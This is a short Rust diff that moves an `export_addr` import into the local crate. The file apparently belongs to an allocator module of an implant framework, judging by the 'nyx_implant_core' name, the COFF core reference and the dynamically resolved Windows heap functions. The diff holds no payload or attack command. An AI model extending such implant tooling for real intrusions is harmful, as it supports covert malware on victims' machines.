@@ -12,9 +12,9 @@
 //! satisfies every `Layout` the COFF core produces (its largest alignment is
 //! `u64`).
 
+use crate::export_addr;
 use core::alloc::{GlobalAlloc, Layout};
 use core::ffi::c_void;
-use nyx_implant_core::resolve::export_addr;
 
 type GetProcessHeapFn = unsafe extern "system" fn() -> *mut c_void;
 type HeapAllocFn = unsafe extern "system" fn(*mut c_void, u32, usize) -> *mut c_void;
